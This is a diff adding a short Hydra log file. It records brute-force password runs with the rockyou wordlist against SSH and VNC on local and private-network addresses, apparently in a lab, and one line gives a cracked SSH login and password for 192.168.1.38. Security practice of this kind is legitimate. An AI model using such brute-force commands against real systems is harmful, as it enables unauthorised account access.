@@ -1,0 +1,6 @@
+# Hydra v9.5 run at 2023-12-17 14:47:15 on 127.0.0.1 ssh (hydra -l zero -P rockyou.txt -t 64 -vV -o output.log -I ssh://127.0.0.1)
+# Hydra v9.5 run at 2023-12-17 14:47:30 on 127.0.0.1 ssh (hydra -l zero -P rockyou.txt -t 64 -vV -o output.log -I ssh://127.0.0.1)
+# Hydra v9.5 run at 2023-12-17 14:49:05 on 192.168.1.38 ssh (hydra -l zero -P rockyou.txt -t 64 -vV -o output.log -I ssh://192.168.1.38)
+[22][ssh] host: 192.168.1.38   login: zero   password: 945531
+# Hydra v9.5 run at 2023-12-17 14:51:32 on 127.0.0.1 vnc (hydra -P rockyou.txt -t 64 -vV -o output.log -I vnc://127.0.0.1)
+# Hydra v9.5 run at 2023-12-17 14:51:58 on 127.0.0.1 vnc (hydra -P rockyou.txt -t 64 -vV -o output.log -I vnc://127.0.0.1)
